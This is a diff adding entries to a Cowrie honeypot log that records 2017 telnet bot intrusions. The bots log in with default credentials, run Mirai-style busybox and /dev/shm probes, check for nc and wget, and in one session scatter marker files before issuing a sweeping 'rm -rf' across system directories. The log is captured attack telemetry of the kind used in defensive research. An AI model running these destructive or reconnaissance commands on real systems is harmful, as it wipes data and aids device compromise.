@@ -788,3 +788,104 @@
 2017-02-26T08:36:59+0000 [CowrieTelnetTransport,1596,67.229.141.98] Connection lost after 42 seconds
 2017-02-26T08:37:00+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 182.180.142.119:58124 (10.8.41.81:2223) [session: TT1601]
 2017-02-26T08:37:00+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 182.180.142.119:58125 (10.8.41.81:2223) [session: TT1602]
+2017-02-26T08:37:04+0000 [CowrieTelnetTransport,1601,182.180.142.119] first time for 182.180.142.119, need: 1
+2017-02-26T08:37:04+0000 [CowrieTelnetTransport,1601,182.180.142.119] login attempt: 1
+2017-02-26T08:37:05+0000 [CowrieTelnetTransport,1601,182.180.142.119] login attempt [root/pass] succeeded
+2017-02-26T08:37:07+0000 [CowrieTelnetTransport,1601,182.180.142.119] Opening TTY Log: log/tty/20170226-083707-None-1601i.log
+2017-02-26T08:37:07+0000 [CowrieTelnetTransport,1601,182.180.142.119] Warning: state changed and new state returned
+2017-02-26T08:37:07+0000 [CowrieTelnetTransport,1602,182.180.142.119] login attempt: 2
+2017-02-26T08:37:07+0000 [CowrieTelnetTransport,1602,182.180.142.119] login return, expect: [root/pass]
+2017-02-26T08:37:07+0000 [CowrieTelnetTransport,1602,182.180.142.119] login attempt [root/888888] failed
+2017-02-26T08:37:07+0000 [CowrieTelnetTransport,1602,182.180.142.119] Warning: state changed and new state returned
+2017-02-26T08:37:07+0000 [CowrieTelnetTransport,1597,67.229.141.98] Connection lost after 42 seconds
+2017-02-26T08:37:08+0000 [CowrieTelnetTransport,1601,182.180.142.119] CMD: enable
+2017-02-26T08:37:08+0000 [CowrieTelnetTransport,1601,182.180.142.119] Command found: enable 
+2017-02-26T08:37:08+0000 [CowrieTelnetTransport,1601,182.180.142.119] Reading txtcmd from "txtcmds/bin/enable"
+2017-02-26T08:37:08+0000 [CowrieTelnetTransport,1601,182.180.142.119] CMD: shell
+2017-02-26T08:37:08+0000 [CowrieTelnetTransport,1601,182.180.142.119] Command not found: shell
+2017-02-26T08:37:08+0000 [CowrieTelnetTransport,1601,182.180.142.119] CMD: sh
+2017-02-26T08:37:08+0000 [CowrieTelnetTransport,1601,182.180.142.119] Command found: sh 
+2017-02-26T08:37:09+0000 [CowrieTelnetTransport,1601,182.180.142.119] CMD: cat /proc/mounts; /bin/busybox ZEMLB
+2017-02-26T08:37:09+0000 [CowrieTelnetTransport,1601,182.180.142.119] Command found: cat /proc/mounts
+2017-02-26T08:37:09+0000 [CowrieTelnetTransport,1601,182.180.142.119] Command found: /bin/busybox ZEMLB
+2017-02-26T08:37:10+0000 [CowrieTelnetTransport,1601,182.180.142.119] CMD: cd /dev/shm; (cat .s || cp /bin/echo .s); /bin/busybox ZEMLB
+2017-02-26T08:37:10+0000 [CowrieTelnetTransport,1601,182.180.142.119] Command found: cd /dev/shm
+2017-02-26T08:37:10+0000 [CowrieTelnetTransport,1601,182.180.142.119] Command found: cat .s
+2017-02-26T08:37:10+0000 [CowrieTelnetTransport,1601,182.180.142.119] Command found: cp /bin/echo .s
+2017-02-26T08:37:10+0000 [CowrieTelnetTransport,1601,182.180.142.119] Command found: /bin/busybox ZEMLB
+2017-02-26T08:37:10+0000 [CowrieTelnetTransport,1601,182.180.142.119] CMD: nc; wget; /bin/busybox ZEMLB
+2017-02-26T08:37:10+0000 [CowrieTelnetTransport,1601,182.180.142.119] Command not found: nc
+2017-02-26T08:37:10+0000 [CowrieTelnetTransport,1601,182.180.142.119] Command found: wget 
+2017-02-26T08:37:10+0000 [CowrieTelnetTransport,1601,182.180.142.119] Command found: /bin/busybox ZEMLB
+2017-02-26T08:37:11+0000 [CowrieTelnetTransport,1602,182.180.142.119] login attempt: 3
+2017-02-26T08:37:11+0000 [CowrieTelnetTransport,1602,182.180.142.119] login return, expect: [root/pass]
+2017-02-26T08:37:11+0000 [CowrieTelnetTransport,1602,182.180.142.119] login attempt [enable\x00/system\x00] failed
+2017-02-26T08:37:11+0000 [CowrieTelnetTransport,1602,182.180.142.119] Warning: state changed and new state returned
+2017-02-26T08:37:11+0000 [CowrieTelnetTransport,1601,182.180.142.119] CMD: (dd bs=52 count=1 if=.s || cat .s)
+2017-02-26T08:37:11+0000 [CowrieTelnetTransport,1601,182.180.142.119] Command not found: dd bs=52 count=1 if=.s
+2017-02-26T08:37:11+0000 [CowrieTelnetTransport,1601,182.180.142.119] Command found: cat /dev/shm/.s
+2017-02-26T08:37:12+0000 [CowrieTelnetTransport,1601,182.180.142.119] CMD: /bin/busybox ZEMLB
+2017-02-26T08:37:12+0000 [CowrieTelnetTransport,1601,182.180.142.119] Command found: /bin/busybox ZEMLB
+2017-02-26T08:37:14+0000 [CowrieTelnetTransport,1602,182.180.142.119] login attempt: 4
+2017-02-26T08:37:14+0000 [CowrieTelnetTransport,1602,182.180.142.119] login return, expect: [root/pass]
+2017-02-26T08:37:15+0000 [CowrieTelnetTransport,1602,182.180.142.119] login attempt [shell\x00/sh\x00] failed
+2017-02-26T08:37:15+0000 [CowrieTelnetTransport,1602,182.180.142.119] Warning: state changed and new state returned
+2017-02-26T08:37:15+0000 [CowrieTelnetTransport,1598,67.229.141.98] Connection lost after 39 seconds
+2017-02-26T08:37:16+0000 [CowrieTelnetTransport,1599,67.229.141.98] Connection lost after 38 seconds
+2017-02-26T08:37:19+0000 [CowrieTelnetTransport,1600,67.229.141.98] Connection lost after 38 seconds
+2017-02-26T08:37:46+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 87.222.214.77:37535 (10.8.41.81:2223) [session: TT1603]
+2017-02-26T08:37:48+0000 [CowrieTelnetTransport,1603,87.222.214.77] first time for 87.222.214.77, need: 1
+2017-02-26T08:37:48+0000 [CowrieTelnetTransport,1603,87.222.214.77] login attempt: 1
+2017-02-26T08:37:49+0000 [CowrieTelnetTransport,1603,87.222.214.77] login attempt [root/root] succeeded
+2017-02-26T08:37:51+0000 [CowrieTelnetTransport,1603,87.222.214.77] Opening TTY Log: log/tty/20170226-083751-None-1603i.log
+2017-02-26T08:37:51+0000 [CowrieTelnetTransport,1603,87.222.214.77] Warning: state changed and new state returned
+2017-02-26T08:37:51+0000 [CowrieTelnetTransport,1602,182.180.142.119] Connection lost after 51 seconds
+2017-02-26T08:37:51+0000 [CowrieTelnetTransport,1603,87.222.214.77] CMD: >/dev/netslink/.t && cd /dev/netslink/ && for a in `ls -a /dev/netslink/`; do >$a; done; >gaybot
+2017-02-26T08:37:51+0000 [CowrieTelnetTransport,1603,87.222.214.77] Command found: > /dev/netslink/.t
+2017-02-26T08:37:51+0000 [CowrieTelnetTransport,1603,87.222.214.77] Command found: cd /dev/netslink/
+2017-02-26T08:37:51+0000 [CowrieTelnetTransport,1603,87.222.214.77] Command not found: for a in ` ls -a /dev/netslink/ `
+2017-02-26T08:37:51+0000 [CowrieTelnetTransport,1603,87.222.214.77] Command not found: do >
+2017-02-26T08:37:51+0000 [CowrieTelnetTransport,1603,87.222.214.77] Command not found: done
+2017-02-26T08:37:51+0000 [CowrieTelnetTransport,1603,87.222.214.77] Command found: > gaybot
+2017-02-26T08:37:51+0000 [CowrieTelnetTransport,1603,87.222.214.77] CMD: >/tmp/.t && cd /tmp/ ; >gaybot
+2017-02-26T08:37:51+0000 [CowrieTelnetTransport,1603,87.222.214.77] Command found: > /tmp/.t
+2017-02-26T08:37:51+0000 [CowrieTelnetTransport,1603,87.222.214.77] Command found: cd /tmp
+2017-02-26T08:37:51+0000 [CowrieTelnetTransport,1603,87.222.214.77] Command found: > gaybot
+2017-02-26T08:37:51+0000 [CowrieTelnetTransport,1603,87.222.214.77] CMD: >/var/.t && cd /var/ ; >gaybot
+2017-02-26T08:37:51+0000 [CowrieTelnetTransport,1603,87.222.214.77] Command found: > /var/.t
+2017-02-26T08:37:51+0000 [CowrieTelnetTransport,1603,87.222.214.77] Command found: cd /var
+2017-02-26T08:37:51+0000 [CowrieTelnetTransport,1603,87.222.214.77] Command found: > gaybot
+2017-02-26T08:37:51+0000 [CowrieTelnetTransport,1603,87.222.214.77] CMD: >/dev/.t && cd /dev/ ; >gaybot
+2017-02-26T08:37:51+0000 [CowrieTelnetTransport,1603,87.222.214.77] Command found: > /dev/.t
+2017-02-26T08:37:51+0000 [CowrieTelnetTransport,1603,87.222.214.77] Command found: cd /dev
+2017-02-26T08:37:51+0000 [CowrieTelnetTransport,1603,87.222.214.77] Command found: > gaybot
+2017-02-26T08:37:51+0000 [CowrieTelnetTransport,1603,87.222.214.77] CMD: >/var/run/.t && cd /var/run/ ; >gaybot
+2017-02-26T08:37:51+0000 [CowrieTelnetTransport,1603,87.222.214.77] Command found: > /var/run/.t
+2017-02-26T08:37:51+0000 [CowrieTelnetTransport,1603,87.222.214.77] Command found: cd /var/run
+2017-02-26T08:37:51+0000 [CowrieTelnetTransport,1603,87.222.214.77] Command found: > gaybot
+2017-02-26T08:37:51+0000 [CowrieTelnetTransport,1603,87.222.214.77] CMD: >/var/tmp.t && cd /var/tmp ; >gaybot
+2017-02-26T08:37:51+0000 [CowrieTelnetTransport,1603,87.222.214.77] Command found: > /var/tmp.t
+2017-02-26T08:37:51+0000 [CowrieTelnetTransport,1603,87.222.214.77] Command found: cd /var/tmp
+2017-02-26T08:37:51+0000 [CowrieTelnetTransport,1603,87.222.214.77] Command found: > gaybot
+2017-02-26T08:37:51+0000 [CowrieTelnetTransport,1603,87.222.214.77] CMD: >/dev/shm/.t && cd /dev/shm/ ; >gaybot
+2017-02-26T08:37:51+0000 [CowrieTelnetTransport,1603,87.222.214.77] Command found: > /dev/shm/.t
+2017-02-26T08:37:51+0000 [CowrieTelnetTransport,1603,87.222.214.77] Command found: cd /dev/shm
+2017-02-26T08:37:51+0000 [CowrieTelnetTransport,1603,87.222.214.77] Command found: > gaybot
+2017-02-26T08:37:51+0000 [CowrieTelnetTransport,1603,87.222.214.77] CMD: >/mnt/.t && cd /mnt/ ; >gaybot
+2017-02-26T08:37:51+0000 [CowrieTelnetTransport,1603,87.222.214.77] Command found: > /mnt/.t
+2017-02-26T08:37:51+0000 [CowrieTelnetTransport,1603,87.222.214.77] Command found: cd /mnt
+2017-02-26T08:37:51+0000 [CowrieTelnetTransport,1603,87.222.214.77] Command found: > gaybot
+2017-02-26T08:37:51+0000 [CowrieTelnetTransport,1603,87.222.214.77] CMD: >/boot/.t && cd /boot/ ; >gaybot
+2017-02-26T08:37:51+0000 [CowrieTelnetTransport,1603,87.222.214.77] Command found: > /boot/.t
+2017-02-26T08:37:51+0000 [CowrieTelnetTransport,1603,87.222.214.77] Command found: cd /boot
+2017-02-26T08:37:51+0000 [CowrieTelnetTransport,1603,87.222.214.77] Command found: > gaybot
+2017-02-26T08:37:51+0000 [CowrieTelnetTransport,1603,87.222.214.77] CMD: >/usr/.t && cd /usr/ ; >gaybot
+2017-02-26T08:37:51+0000 [CowrieTelnetTransport,1603,87.222.214.77] Command found: > /usr/.t
+2017-02-26T08:37:51+0000 [CowrieTelnetTransport,1603,87.222.214.77] Command found: cd /usr
+2017-02-26T08:37:51+0000 [CowrieTelnetTransport,1603,87.222.214.77] Command found: > gaybot
+2017-02-26T08:37:52+0000 [CowrieTelnetTransport,1603,87.222.214.77] CMD: rm -rf /tmp/* /var/* /dev/* /var/run/* /var/tmp/* /dev/shm/* /mnt/* /boot/* /usr/*
+2017-02-26T08:37:52+0000 [CowrieTelnetTransport,1603,87.222.214.77] Command found: rm -rf /tmp/.X11-unix /tmp/.ICE-unix /tmp/.t /tmp/gaybot /var/log /var/run /var/mail /var/tmp /var/opt /var/local /var/backups /var/spool /var/lock /var/lib /var/cache /var/.t /var/gaybot /var/tmp.t /dev/xconsole /dev/loop7 /dev/loop6 /dev/loop5 /dev/loop4 /dev/loop3 /dev/loop2 /dev/loop1 /dev/shm /dev/vcsa6 /dev/vcs6 /dev/vcsa5 /dev/vcs5 /dev/vcsa4 /dev/vcs4 /dev/vcsa3 /dev/vcs3 /dev/vcsa2 /dev/vcs2 /dev/root /dev/sndstat /dev/hidraw0 /dev/vboxuser /dev/vboxguest /dev/MAKEDEV /dev/dvd /dev/cdrom /dev/snd /dev/uinput /dev/fuse /dev/autofs /dev/cpu /dev/loop0 /dev/disk /dev/block /dev/sg1 /dev/sg0 /dev/sda5 /dev/sda2 /dev/sda1 /dev/sr0 /dev/sda /dev/bsg /dev/bus /dev/rtc /dev/char /dev/mapper /dev/ppp /dev/net /dev/loop-control /dev/btrfs-control /dev/stderr /dev/stdout /dev/stdin /dev/fd /dev/core /dev/pts /dev/network_throughput /dev/network_latency /dev/cpu_dma_latency /dev/rtc0 /dev/psaux /dev/input /dev/hpet /dev/ttyS3 /dev/ttyS2 /dev/ttyS1 /dev/ttyS0 /dev/ptmx /dev/snapshot /dev/mcelog /dev/tty63 /dev/tty62 /dev/tty61 /dev/tty60 /dev/tty59 /dev/tty58 /dev/tty57 /dev/tty56 /dev/tty55 /dev/tty54 /dev/tty53 /dev/tty52 /dev/tty51 /dev/tty50 /dev/tty49 /dev/tty48 /dev/tty47 /dev/tty46 /dev/tty45 /dev/tty44 /dev/tty43 /dev/tty42 /dev/tty41 /dev/tty40 /dev/tty39 /dev/tty38 /dev/tty37 /dev/tty36 /dev/tty35 /dev/tty34 /dev/tty33 /dev/tty32 /dev/tty31 /dev/tty30 /dev/tty29 /dev/tty28 /dev/tty27 /dev/tty26 /dev/tty25 /dev/tty24 /dev/tty23 /dev/tty22 /dev/tty21 /dev/tty20 /dev/tty19 /dev/tty18 /dev/tty17 /dev/tty16 /dev/tty15 /dev/tty14 /dev/tty13 /dev/tty12 /dev/tty11 /dev/tty10 /dev/tty9 /dev/tty8 /dev/tty7 /dev/tty6 /dev/tty5 /dev/tty4 /dev/tty3 /dev/tty2 /dev/tty1 /dev/vcsa1 /dev/vcs1 /dev/vcsa /dev/vcs /dev/tty0 /dev/console /dev/tty /dev/oldmem /dev/kmsg /dev/urandom /dev/random /dev/full /dev/zero /dev/port /dev/null /dev/mem /dev/vga_arbiter /dev/.t /dev/gaybot /var/run/sshd.pid /var/run/sshd /var/run/crond.reboot /var/run/crond.pid /var/run/acpid.pid /var/run/acpid.socket /var/run/motd.dynamic /var/run/dhclient.eth0.pid /var/run/network /var/run/shm /var/run/mount /var/run/lock /var/run/sendsigs.omit.d /var/run/initctl /var/run/utmp /var/run/udev /var/run/initramfs /var/run/.t /var/run/gaybot /var/tmp/gaybot /dev/shm/.tmpfs /dev/shm/.t /dev/shm/gaybot /mnt/.t /mnt/gaybot /boot/vmlinuz-3.2.0-4-686-pae /boot/System.map-3.2.0-4-686-pae /boot/initrd.img-3.2.0-4-686-pae /boot/grub /boot/config-3.2.0-4-686-pae /boot/.t /boot/gaybot /usr/sbin /usr/games /usr/bin /usr/src /usr/local /usr/share /usr/include /usr/lib /usr/.t /usr/gaybot
+2017-02-26T08:37:52+0000 [CowrieTelnetTransport,1603,87.222.214.77] Closing TTY Log: log/tty/20170226-083751-None-1603i.log after 1 seconds
+2017-02-26T08:37:52+0000 [CowrieTelnetTransport,1603,87.222.214.77] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionLost'>: Connection to the other side was lost in a non-clean fashion.
+	]
+2017-02-26T08:37:52+0000 [CowrieTelnetTransport,1603,87.222.214.77] Connection lost after 6 seconds
